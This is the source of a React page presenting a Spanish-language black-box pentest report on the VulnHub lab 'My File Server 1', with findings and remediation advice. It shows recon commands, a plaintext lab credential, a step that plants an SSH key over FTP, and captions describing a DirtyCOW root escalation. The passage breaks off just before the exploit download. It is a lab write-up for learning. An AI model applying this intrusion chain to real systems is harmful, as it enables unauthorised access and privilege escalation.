import { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import ActivityFigure from "../components/activities/ActivityFigure";
import ActivitySection from "../components/activities/ActivitySection";
import ResourceLink from "../components/activities/ResourceLink";

const imageModules = import.meta.glob("../assets/activity-13/*.png", {
  eager: true,
  query: "?url",
  import: "default",
});

const image = (key) => imageModules[`../assets/activity-13/ev-${key}.png`];

const resourceBase = import.meta.env.BASE_URL + "resources/activity-13";

const pageSections = [
  { id: "resumen", label: "Executive summary" },
  { id: "alcance", label: "Alcance" },
  { id: "metodologia", label: "Metodología" },
  { id: "reconocimiento", label: "Reconocimiento" },
  { id: "enumeracion", label: "Enumeración" },
  { id: "explotacion", label: "Explotación" },
  { id: "postexplotacion", label: "Post-explotación y escalada" },
  { id: "impacto", label: "Análisis de impacto (CIA)" },
  { id: "recomendaciones", label: "Recomendaciones técnicas" },
  { id: "hallazgos", label: "Tabla de hallazgos" },
  { id: "referencias", label: "Referencias" },
  { id: "recursos", label: "Recursos" },
];

const evidenceGroups = {
  recon: [
    ["01", "Configuración de red de Kali Linux (ip a): interfaz eth1 en 192.168.56.102/24."],
    ["02", "Hosts activos detectados por netdiscover sobre el segmento 192.168.56.0/24."],
    ["03", "nmap -p- -A: puertos FTP, SSH, HTTP y rpcbind identificados."],
    ["04", "nmap -p- -A (continuación): rpcinfo, Samba, ProFTPD, mountd y estimación de OS."],
    ["05", "Segundo escaneo (nmap -p- -sV) confirmando los mismos puertos y versiones."],
  ],
  ftp: [["06", "Sesión FTP anónima: directorio pub con copia completa de /var/log."]],
  web: [["07", "Escaneo con Nikto: /readme.txt señalado como potencialmente interesante."]],
  smb: [["08", "smbmap -H: sesión nula con recurso smbdata en lectura/escritura abierta."]],
  readme: [["09", "Acceso directo a /readme.txt desde el navegador: contraseña en texto plano."]],
  exploitation: [
    ["10", "Generación de un par de llaves SSH (ssh-keygen) en Kali."],
    ["11", "Sesión FTP como smbuser: creación de .ssh y subida de authorized_keys."],
    ["12", "Acceso SSH exitoso como smbuser sin necesidad de contraseña."],
  ],
  escalation: [
    ["13", "uname -a: kernel Linux 3.10.0-229.el7, anterior al parche de DirtyCOW."],
    ["14", "Descarga del exploit DirtyCOW y servidor HTTP temporal en Kali."],
    ["15", "Compilación del exploit con gcc (advertencia de lseek sin impacto funcional)."],
    ["16", "Ejecución de ./dirtycow: sobrescritura de /usr/bin/passwd y shell como root."],
    ["17", "Lectura de /root/proof.txt, confirmando el compromiso total del sistema."],
  ],
};

function EvidenceGrid({ items, start }) {
  const gridClassName =
    items.length > 1 ? "grid gap-x-6 md:grid-cols-2" : "grid";

  return (
    <div className={gridClassName}>
      {items.map(([key, caption], index) => (
        <ActivityFigure
          key={key}
          src={image(key)}
          alt={caption}
          number={String(start + index).padStart(2, "0")}
          caption={caption}
          className="max-w-none"
        />
      ))}
    </div>
  );
}

function CodeBlock({ children }) {
  return (
    <pre className="my-6 overflow-x-auto border border-border bg-foreground p-5 font-mono text-sm leading-7 text-background">
      <code>{children}</code>
    </pre>
  );
}

const findings = [
  {
    id: "H-01",
    vuln: "Acceso FTP anónimo con escritura y exposición de /var/log",
    severity: "Alta",
    evidence:
      "El servidor vsftpd 3.0.2 aceptó la autenticación con el usuario anonymous sin contraseña. Dentro del directorio pub se encontró una copia completa de /var/log, incluyendo secure, messages, cron, wtmp y btmp.",
    impact:
      "Lectura no autenticada de registros de auditoría del sistema, lo que permite enumerar usuarios, sesiones, intentos de acceso y actividad interna del servidor.",
    recommendation:
      "Deshabilitar el inicio de sesión anónimo en vsftpd y revisar los permisos de los directorios compartidos para que ningún recurso quede con escritura pública sin autenticación.",
  },
  {
    id: "H-02",
    vuln: "Contraseña en texto plano expuesta en archivo público (/readme.txt)",
    severity: "Alta",
    evidence:
      "El archivo /readme.txt del servidor Apache era accesible sin autenticación y contenía la cadena rootroot1 en texto plano, sin indicar a qué cuenta pertenecía.",
    impact:
      "Obtención directa de una credencial válida del sistema sin necesidad de explotación, que al combinarse con el nombre de usuario smbuser permitió el acceso inicial.",
    recommendation:
      "Eliminar el archivo del servidor web y establecer una política que prohíba almacenar o transmitir contraseñas sin cifrado.",
  },
  {
    id: "H-03",
    vuln: "Recurso compartido smbdata con permisos de lectura y escritura sin autenticación",
    severity: "Media",
    evidence:
      "La enumeración SMB mediante sesión nula mostró el recurso smbdata con permisos READ, WRITE accesibles sin credenciales, y el recurso smbuser con acceso denegado pero visible, revelando el nombre de una cuenta del sistema.",
    impact:
      "Exposición de la estructura de recursos compartidos y de un nombre de usuario válido, además de permitir la modificación del contenido de smbdata por cualquier host de la red.",
    recommendation:
      "Deshabilitar las sesiones nulas en Samba (restrict anonymous) y exigir autenticación válida para todos los recursos, especialmente aquellos que exponen bitácoras o datos operativos.",
  },
  {
    id: "H-04",
    vuln: "Firmado de mensajes SMB (message signing) deshabilitado",
    severity: "Media",
    evidence:
      "El análisis de SMB indicó message_signing: disabled (dangerous, but default), permitiendo que los mensajes no vayan firmados ni verificados.",
    impact: "Mayor exposición a ataques de tipo SMB relay y manipulación de tráfico SMB dentro de la red interna.",
    recommendation: "Habilitar el firmado de mensajes de forma obligatoria en la configuración de Samba.",
  },
  {
    id: "H-05",
    vuln: "Kernel de Linux desactualizado, vulnerable a Dirty COW (CVE-2016-5195)",
    severity: "Crítica",
    evidence:
      "El comando uname -a mostró un kernel 3.10.0-229.el7.x86_64 compilado en marzo de 2015, anterior al parche de Dirty COW. La ejecución del exploit sobrescribió /usr/bin/passwd y otorgó una shell con privilegios de root, confirmada con la lectura de /root/proof.txt.",
    impact:
      "Escalada de privilegios de un usuario estándar (smbuser) a administrador absoluto (root), con control total sobre archivos, servicios y configuraciones del sistema.",
    recommendation:
      "Actualizar el kernel a una versión parchada o migrar a un sistema operativo con soporte de seguridad activo. CentOS 7, usado en esta máquina, ya alcanzó su fin de vida.",
  },
  {
    id: "H-06",
    vuln: "Método HTTP TRACE habilitado en Apache",
    severity: "Baja",
    evidence:
      "El análisis con Nikto reportó OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE, confirmando que el método TRACE está activo y responde.",
    impact: "Posible explotación mediante ataques de Cross-Site Tracing (XST) para acceder a encabezados o cookies de sesión.",
    recommendation: "Deshabilitar el método TRACE en la configuración del servidor Apache.",
  },
  {
    id: "H-07",
    vuln: "Encabezados de seguridad HTTP faltantes (CSP, HSTS, X-Content-Type-Options)",
    severity: "Baja",
    evidence:
      "Nikto señaló la ausencia de Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, Referrer-Policy y Permissions-Policy en las respuestas del servidor.",
    impact: "Mayor superficie de ataque para cross-site scripting, sniffing de contenido y otras técnicas de inyección sobre los clientes del servidor web.",
    recommendation: "Agregar los encabezados de seguridad recomendados en la configuración de Apache.",
  },
];

const references = [
  {
    text: "Armour Infosec. (2020). My File Server 1.",
    url: "https://www.armourinfosec.com/my-file-server-1/",
  },
  {
    text: "Microsoft. (2023). Microsoft network server: Digitally sign communications (always). Microsoft Learn.",
    url: "https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always",
  },
  {
    text: "NVD. (2016). CVE-2016-5195 Detail. National Vulnerability Database.",
    url: "https://nvd.nist.gov/vuln/detail/CVE-2016-5195",
  },
  {
    text: "OpenSSH. (2024). OpenSSH Manual Pages.",
    url: "https://www.openssh.com/manual.html",
  },
  {
    text: "OWASP. (2024). Cross-Site Tracing (XST). OWASP Community.",
    url: "https://owasp.org/www-community/attacks/Cross_Site_Tracing",
  },
  {
    text: "OWASP. (2024). FTP Security. OWASP Community.",
    url: "https://owasp.org/www-community/FTP_Security",
  },
  {
    text: "OWASP. (2024). OWASP Secure Headers Project.",
    url: "https://owasp.org/www-project-secure-headers/",
  },
  {
    text: "Red Hat. (2016). Dirty COW (CVE-2016-5195). Red Hat Security.",
    url: "https://access.redhat.com/security/vulnerabilities/2298781",
  },
  {
    text: "Samba Team. (2024). smb.conf — Samba configuration file. Samba Documentation.",
    url: "https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html",
  },
  {
    text: "vsftpd. (2024). vsftpd — Secure, fast and stable FTP server.",
    url: "https://security.appspot.com/vsftpd.html",
  },
  {
    text: "VulnHub. (2020). My File Server: 1.",
    url: "https://www.vulnhub.com/entry/my-file-server-1,442/",
  },
];

function SeverityBadge({ level }) {
  const isHigh = level === "Crítica" || level === "Alta";
  return (
    <span
      className={[
        "font-mono text-[0.68rem] whitespace-nowrap tracking-wider uppercase",
        isHigh ? "font-semibold text-accent" : "text-muted",
      ].join(" ")}
    >
      {level}
    </span>
  );
}

function Activity13() {
  const [activeSection, setActiveSection] = useState(pageSections[0].id);

  useEffect(() => {
    const sectionElements = pageSections
      .map((section) => document.getElementById(section.id))
      .filter(Boolean);

    const observer = new IntersectionObserver(
      (entries) => {
        const visibleEntry = entries
          .filter((entry) => entry.isIntersecting)
          .sort(
            (first, second) =>
              second.intersectionRatio - first.intersectionRatio,
          )[0];

        if (visibleEntry) setActiveSection(visibleEntry.target.id);
      },
      {
        rootMargin: "-24% 0px -62% 0px",
        threshold: [0, 0.25, 0.5, 0.75],
      },
    );

    sectionElements.forEach((section) => observer.observe(section));
    return () => observer.disconnect();
  }, []);

  return (
    <article>
      <header className="border-b border-border">
        <div className="mx-auto max-w-7xl px-5 pt-8 pb-14 sm:px-8 md:pt-10 md:pb-20">
          <Link
            to="/activities"
            className="inline-flex min-h-11 items-center text-sm font-semibold text-muted transition-colors hover:text-accent"
          >
            Volver a actividades
          </Link>

          <div className="mt-6 grid gap-12 lg:grid-cols-12 lg:items-end">
            <div className="lg:col-span-8">
              <p className="font-mono text-xs tracking-[0.18em] text-accent uppercase">
                Parcial II / Actividad 13
              </p>
              <h1 className="mt-6 max-w-5xl text-[clamp(2.75rem,6vw,5.25rem)] leading-[0.94] font-semibold tracking-[-0.055em]">
                Red team report:{" "}
                <span className="font-serif font-normal italic text-accent">
                  My File Server 1
                </span>
              </h1>
              <p className="mt-8 max-w-3xl text-[clamp(1.1rem,2vw,1.35rem)] leading-8 text-muted">
                Informe de pruebas de penetración de caja negra sobre un
                servidor de archivos corporativo simulado, desde el
                reconocimiento hasta la obtención de acceso root, con una
                presentación ejecutiva para Consejo Directivo.
              </p>
            </div>

            <dl className="grid grid-cols-2 gap-x-6 gap-y-5 border-t border-border pt-6 font-mono text-xs lg:col-span-4 lg:border-t-0 lg:border-l lg:pt-0 lg:pl-10">
              <div>
                <dt className="tracking-wider text-muted uppercase">Estado</dt>
                <dd className="mt-1 text-accent">Completo</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">Riesgo</dt>
                <dd className="mt-1 text-accent">Crítico</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">
                  Atacante
                </dt>
                <dd className="mt-1">Kali Linux</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">
                  Objetivo
                </dt>
                <dd className="mt-1">My File Server: 1</dd>
              </div>
            </dl>
          </div>

          <div className="mt-10 flex flex-wrap gap-3">
            <a
              href={resourceBase + "/184346_act13.pdf"}
              download="184346_act13.pdf"
              className="inline-flex min-h-11 items-center justify-center bg-accent px-5 py-3 text-sm font-semibold text-background transition-colors hover:bg-accent-hover"
            >
              Descargar informe
            </a>
            <a
              href={resourceBase + "/184346_act13_presentacion.pdf"}
              download="184346_act13_presentacion.pdf"
              className="inline-flex min-h-11 items-center justify-center border border-border px-5 py-3 text-sm font-semibold transition-colors hover:border-accent hover:bg-surface"
            >
              Descargar presentación
            </a>
            <Link
              to="/activities/activity-13#hallazgos"
              className="inline-flex min-h-11 items-center justify-center border border-border px-5 py-3 text-sm font-semibold transition-colors hover:border-accent hover:bg-surface"
            >
              Ver hallazgos
            </Link>
          </div>
        </div>
      </header>

      <div className="mx-auto grid max-w-7xl gap-14 px-5 py-16 sm:px-8 md:py-24 lg:grid-cols-12 lg:gap-16">
        <aside className="min-w-0 lg:col-span-3">
          <div className="border-t border-border pt-5 lg:sticky lg:top-36">
            <p className="font-mono text-[0.68rem] tracking-wider text-muted uppercase">
              En este informe
            </p>
            <nav aria-label="Contenido de la Actividad 13" className="mt-4">
              <ol className="space-y-1">
                {pageSections.map((section, index) => (
                  <li key={section.id}>
                    <Link
                      to={`/activities/activity-13#${section.id}`}
                      aria-current={
                        activeSection === section.id ? "location" : undefined
                      }
                      className={[
                        "grid min-h-10 grid-cols-[2rem_1fr] items-center border-l pl-3 text-sm transition-[color,border-color,transform] duration-200",
                        activeSection === section.id
                          ? "translate-x-1 border-accent text-accent"
                          : "border-transparent text-muted hover:text-accent",
                      ].join(" ")}
                    >
                      <span className="font-mono text-[0.65rem]">
                        {String(index + 1).padStart(2, "0")}
                      </span>
                      <span>{section.label}</span>
                    </Link>
                  </li>
                ))}
              </ol>
            </nav>

            <div className="mt-8 border-t border-border pt-5">
              <p className="font-mono text-[0.68rem] tracking-wider text-muted uppercase">
                Herramientas
              </p>
              <p className="mt-3 text-sm leading-6 text-muted">
                netdiscover · Nmap · cliente FTP · Nikto · smbmap · ssh-keygen
                · OpenSSH · DirtyCOW (CVE-2016-5195)
              </p>
            </div>
          </div>
        </aside>

        <div className="min-w-0 space-y-24 lg:col-span-9">
          <ActivitySection id="resumen" number="01" title="Executive summary">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La evaluación de seguridad realizada sobre{" "}
                <strong>My File Server 1</strong> tuvo como objetivo
                identificar debilidades que pudieran ser aprovechadas para
                obtener acceso no autorizado al servidor, y determinar el
                nivel de exposición que representarían para una
                organización.
              </p>
              <p>
                La revisión se realizó bajo un enfoque de{" "}
                <strong>caja negra</strong>, sin credenciales ni información
                previa sobre el sistema ni sus configuraciones internas. A
                partir de los servicios expuestos se identificaron varias
                configuraciones inseguras que permitieron avanzar desde el
                reconocimiento hasta el compromiso completo del servidor.
              </p>
              <p>
                Entre los hallazgos más relevantes se encontró un servicio
                FTP con acceso anónimo y permisos excesivos, registros
                internos del sistema expuestos, una contraseña almacenada en
                texto plano dentro de un archivo accesible desde el servidor
                web, y una configuración de SMB que permitía obtener
                información sobre usuarios y recursos compartidos sin
                autenticación. Esta información permitió identificar una
                cuenta válida y establecer acceso al sistema mediante SSH.
              </p>
              <p>
                Una vez obtenido el acceso como usuario estándar, se detectó
                que el servidor utilizaba un kernel de Linux desactualizado y
                vulnerable a <strong>DirtyCOW (CVE-2016-5195)</strong>. La
                explotación de esta vulnerabilidad permitió elevar los
                privilegios hasta alcanzar root y obtener el control total
                del sistema.
              </p>
              <p>
                El nivel general de riesgo se considera <strong>crítico</strong>:
                la exposición de información, los controles de acceso
                insuficientes, las credenciales mal protegidas y el software
                sin actualizar se encadenan en un camino directo hacia
                accesos no autorizados a archivos confidenciales,
                modificación o eliminación de información, interrupción de
                servicios y, en el peor caso, pérdida total del control
                administrativo del sistema.
              </p>
            </div>
          </ActivitySection>

          <ActivitySection id="alcance" number="02" title="Alcance">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La evaluación se limitó al servidor de archivos identificado
                como My File Server 1 y a los servicios de red expuestos
                directamente por este activo, bajo un enfoque de caja negra,
                sin acceso previo a credenciales, documentación interna ni
                información sobre la configuración del sistema.
              </p>
              <p>
                El objetivo fue determinar hasta qué punto un atacante con
                acceso al mismo segmento de red podría identificar servicios
                vulnerables, obtener información útil para un acceso inicial
                y avanzar hasta comprometer el sistema.
              </p>
              <p>
                Quedaron fuera del alcance las pruebas de denegación de
                servicio, los ataques de ingeniería social, la evaluación de
                otros equipos de la red y cualquier acción intencionalmente
                destructiva; durante la prueba se evitó dejar el servidor en
                un estado inoperable.
              </p>
              <p>
                Para fines de documentación técnica, el objetivo fue
                identificado con la dirección IP <code>192.168.56.104</code>,
                mientras que el equipo utilizado para la evaluación operó
                desde <code>192.168.56.102</code>.
              </p>
            </div>
          </ActivitySection>

          <ActivitySection
            id="metodologia"
            number="03"
            title="Metodología aplicada"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La evaluación se desarrolló siguiendo una secuencia basada en
                los lineamientos generales de <strong>PTES</strong>{" "}
                (Penetration Testing Execution Standard), dividiendo el
                trabajo en cuatro fases: reconocimiento, enumeración,
                explotación y post-explotación con escalada de privilegios.
              </p>
              <p>
                Durante el <strong>reconocimiento</strong> se identificó el
                servidor objetivo dentro del segmento de red y se
                determinaron los servicios expuestos. En la{" "}
                <strong>enumeración</strong> se revisó cada servicio con
                mayor detalle para localizar configuraciones débiles,
                recursos accesibles e información que pudiera facilitar un
                acceso inicial.
              </p>
              <p>
                La <strong>explotación</strong> consistió en aprovechar las
                debilidades identificadas para obtener acceso al sistema con
                una cuenta de usuario estándar. A partir de ahí, la{" "}
                <strong>post-explotación</strong> se enfocó en revisar el
                entorno interno y buscar una forma de elevar privilegios
                hasta obtener acceso administrativo.
              </p>
              <p>
                Para estas etapas se utilizaron <code>netdiscover</code>,{" "}
                <code>nmap</code>, clientes FTP, <code>smbmap</code>,{" "}
                <code>Nikto</code>, <code>ssh-keygen</code>,{" "}
                <code>OpenSSH</code> y un exploit público asociado a
                DirtyCOW (CVE-2016-5195).
              </p>
            </div>
          </ActivitySection>

          <ActivitySection
            id="reconocimiento"
            number="04"
            title="Reconocimiento"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Antes de iniciar el reconocimiento se verificó la
                configuración de red del equipo atacante con{" "}
                <code>ip a</code>, confirmando que la interfaz host-only
                (eth1) tenía asignada la dirección{" "}
                <code>192.168.56.102/24</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.recon.slice(0, 1)} start={1} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Después se utilizó <strong>netdiscover</strong> sobre el
                rango <code>192.168.56.0/24</code> para identificar los
                dispositivos activos dentro del segmento, mediante
                solicitudes ARP:
              </p>
            </div>
            <CodeBlock>sudo netdiscover -i eth1 -r 192.168.56.0/24</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El escaneo mostró dos direcciones adicionales:{" "}
                <code>192.168.56.100</code>, correspondiente a infraestructura
                de la red virtual, y <code>192.168.56.104</code>, identificada
                como el servidor objetivo de la evaluación.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.recon.slice(1, 2)} start={2} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con el objetivo localizado, se realizó un escaneo completo
                con Nmap para conocer la superficie de red expuesta por el
                servidor:
              </p>
            </div>
            <CodeBlock>nmap -p- -A 192.168.56.104</CodeBlock>
            <div className="overflow-x-auto border-y border-border">
              <table className="w-full min-w-[38rem] text-left">
                <thead className="font-mono text-xs tracking-wider text-muted uppercase">
                  <tr>
                    <th className="px-4 py-4 font-normal">Puerto</th>
                    <th className="px-4 py-4 font-normal">Servicio</th>
                    <th className="px-4 py-4 font-normal">Versión</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  <tr>
                    <td className="px-4 py-4">21/tcp</td>
                    <td className="px-4 py-4">FTP</td>
                    <td className="px-4 py-4">vsftpd 3.0.2</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">22/tcp</td>
                    <td className="px-4 py-4">SSH</td>
                    <td className="px-4 py-4">OpenSSH 7.4</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">80/tcp</td>
                    <td className="px-4 py-4">HTTP</td>
                    <td className="px-4 py-4">Apache httpd 2.4.6 (CentOS)</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">111/tcp</td>
                    <td className="px-4 py-4">rpcbind</td>
                    <td className="px-4 py-4">—</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">445/tcp</td>
                    <td className="px-4 py-4">SMB</td>
                    <td className="px-4 py-4">Samba</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">2049/tcp</td>
                    <td className="px-4 py-4">NFS</td>
                    <td className="px-4 py-4">—</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">2121/tcp</td>
                    <td className="px-4 py-4">FTP</td>
                    <td className="px-4 py-4">ProFTPD 1.3.5</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">20048/tcp</td>
                    <td className="px-4 py-4">mountd</td>
                    <td className="px-4 py-4">—</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <EvidenceGrid items={evidenceGroups.recon.slice(2, 4)} start={3} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                En conjunto, estos servicios mostraron una superficie de
                ataque amplia para un servidor de archivos. FTP, HTTP y SMB
                se consideraron especialmente relevantes para continuar con
                la enumeración, mientras que los servicios asociados con NFS
                indicaban mecanismos adicionales para compartir archivos a
                través de la red.
              </p>
              <p>
                Al final del reconocimiento se realizó un segundo escaneo con
                detección de versiones, que confirmó los mismos ocho puertos
                y las versiones ya detectadas:
              </p>
            </div>
            <CodeBlock>nmap -p- 192.168.56.104 -sV</CodeBlock>
            <EvidenceGrid items={evidenceGroups.recon.slice(4)} start={5} />
          </ActivitySection>

          <ActivitySection id="enumeracion" number="05" title="Enumeración">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con los servicios principales identificados, la siguiente
                etapa se enfocó en revisar aquellos que podían exponer
                información útil o facilitar un acceso inicial. Se
                priorizaron FTP, HTTP y SMB, ya que los tres presentaban
                configuraciones que podían aprovecharse sin requerir
                autenticación previa.
              </p>
            </div>

            <h3 className="mt-10 text-lg font-semibold">
              FTP en el puerto 21
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El servicio FTP fue revisado manualmente con{" "}
                <code>ftp 192.168.56.104</code>. Una vez establecida la
                sesión anónima, se accedió al directorio <code>pub</code> y
                posteriormente a la carpeta <code>log</code>, donde se
                encontró una copia del directorio <code>/var/log</code> del
                sistema, con archivos como <code>secure</code>,{" "}
                <code>messages</code>, <code>cron</code>, <code>wtmp</code> y{" "}
                <code>btmp</code>.
              </p>
              <p>
                La exposición de estos archivos puede revelar información
                sobre autenticaciones, actividad de servicios y eventos
                internos del servidor. Registros como <code>secure</code>,{" "}
                <code>wtmp</code> y <code>btmp</code> pueden ayudar a
                identificar usuarios existentes y patrones de acceso.
                Aunque este hallazgo no otorgó acceso directo al sistema, sí
                mostró que el servicio FTP exponía información que
                normalmente debería mantenerse restringida.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.ftp} start={6} />

            <h3 className="mt-14 text-lg font-semibold">
              Servicio web en el puerto 80
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Después de revisar FTP, se evaluó el servidor web
                identificado en el puerto 80:
              </p>
            </div>
            <CodeBlock>nikto -h 192.168.56.104</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El análisis mostró que el servidor utilizaba Apache 2.4.6
                sobre CentOS y detectó varias configuraciones que requerían
                revisión: el método HTTP TRACE habilitado, ausencia de
                encabezados de seguridad y una versión desactualizada de
                Apache. También apareció una referencia al archivo{" "}
                <code>/readme.txt</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.web} start={7} />

            <h3 className="mt-14 text-lg font-semibold">
              SMB en el puerto 445
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>Posteriormente se revisó el servicio SMB mediante:</p>
            </div>
            <CodeBlock>smbmap -H 192.168.56.104</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La herramienta permitió establecer una sesión sin
                autenticación y mostró cuatro recursos compartidos,
                incluyendo uno llamado <code>smbuser</code> con acceso
                denegado y otro llamado <code>smbdata</code> con permisos de
                lectura y escritura abiertos a cualquiera. El nombre del
                recurso <code>smbuser</code> reveló el nombre de un usuario
                válido del sistema.
              </p>
              <p>
                Aunque no era posible acceder directamente al recurso{" "}
                <code>smbuser</code>, su nombre reveló la existencia de un
                identificador que podía corresponder a una cuenta válida del
                sistema. Por otro lado, los permisos de lectura y escritura
                detectados sobre <code>smbdata</code> representaban una
                configuración permisiva para un recurso accesible sin
                autenticación.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.smb} start={8} />

            <h3 className="mt-14 text-lg font-semibold">
              Credencial expuesta en /readme.txt
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                A partir del recurso señalado por Nikto, se accedió
                manualmente al archivo{" "}
                <code>http://192.168.56.104/readme.txt</code>. El contenido
                mostraba directamente una contraseña almacenada en texto
                plano: <code>rootroot1</code>.
              </p>
              <p>
                El archivo no indicaba a qué cuenta pertenecía la
                contraseña. Sin embargo, durante la enumeración de SMB ya se
                había identificado el nombre <code>smbuser</code> como
                posible usuario del sistema. La combinación de ambos
                hallazgos permitió plantear la pareja de credenciales:
              </p>
              <ul className="list-disc space-y-2 pl-5">
                <li>
                  <strong>Usuario</strong>: smbuser
                </li>
                <li>
                  <strong>Contraseña</strong>: rootroot1
                </li>
              </ul>
              <p>
                La enumeración permitió conectar información obtenida desde
                distintos servicios: FTP expuso registros internos, SMB
                reveló recursos compartidos y un posible nombre de usuario,
                mientras que el servidor web dejó accesible una contraseña en
                texto plano. Estos hallazgos proporcionaron los elementos
                necesarios para continuar con la fase de explotación.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.readme} start={9} />
          </ActivitySection>

          <ActivitySection id="explotacion" number="06" title="Explotación">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La fase de enumeración dejó una combinación de usuario y
                contraseña que podía probarse contra los servicios
                disponibles. Sin embargo, para obtener un acceso remoto más
                estable al servidor, se optó por utilizar autenticación
                mediante llave SSH. Primero se generó un nuevo par de llaves
                desde el equipo de evaluación:
              </p>
            </div>
            <CodeBlock>ssh-keygen</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El sistema creó un par de llaves ED25519, almacenando la
                llave privada en <code>id_ed25519</code> y la pública en{" "}
                <code>id_ed25519.pub</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.exploitation.slice(0, 1)} start={10} />

            <h3 className="mt-14 text-lg font-semibold">
              Preparación del acceso mediante FTP
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Las credenciales identificadas durante la enumeración se
                probaron primero contra el servicio FTP:
              </p>
            </div>
            <CodeBlock>ftp 192.168.56.104</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El inicio de sesión con el usuario <code>smbuser</code> fue
                exitoso, permitiendo acceder directamente a su directorio
                personal <code>/home/smbuser</code>. Aprovechando los
                permisos disponibles sobre esa ruta, se creó el directorio{" "}
                <code>.ssh</code> y se transfirió la llave pública generada
                previamente con el nombre <code>authorized_keys</code>. De
                esta forma, la llave quedó registrada como una identidad
                autorizada para el usuario <code>smbuser</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.exploitation.slice(1, 2)} start={11} />

            <h3 className="mt-14 text-lg font-semibold">
              Acceso inicial mediante SSH
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con la llave pública almacenada en el servidor, se intentó
                establecer una sesión SSH:
              </p>
            </div>
            <CodeBlock>ssh smbuser@192.168.56.104</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La autenticación fue aceptada y se obtuvo una terminal
                interactiva bajo la identidad de <code>smbuser</code>. El
                banner del servidor confirmó además que se trataba de My File
                Server 1.
              </p>
              <p>
                El acceso conseguido en esta etapa correspondía todavía a una
                cuenta con privilegios limitados. Sin embargo, ya permitía
                interactuar directamente con el sistema operativo y revisar
                su configuración interna, lo que abrió la posibilidad de
                buscar una vía para elevar privilegios.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.exploitation.slice(2)} start={12} />
          </ActivitySection>

          <ActivitySection
            id="postexplotacion"
            number="07"
            title="Post-explotación y escalada de privilegios"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Una vez establecida la sesión SSH interactiva, se ejecutó el
                comando de reconocimiento local para determinar la versión
                del kernel en ejecución:
              </p>
            </div>
            <CodeBlock>uname -a</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La salida reveló un kernel Linux{" "}
                <code>3.10.0-229.el7.x86_64</code>, compilado en marzo de
                2015. Esta versión es anterior al parche de la vulnerabilidad{" "}
                <strong>DirtyCOW (CVE-2016-5195)</strong>, una condición de
                carrera en el subsistema de memoria del kernel de Linux que
                permite a un usuario sin privilegios escribir en archivos de
                solo lectura, incluyendo binarios del sistema.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.escalation.slice(0, 1)} start={13} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Debido a que el directorio home del usuario puede contar con
                restricciones de ejecución, se trabajó desde la partición
                temporal del sistema, con permisos de lectura y escritura
                globales por diseño. En la máquina atacante se descargó el
                exploit público de DirtyCOW desde GitHub:
              </p>
            </div>
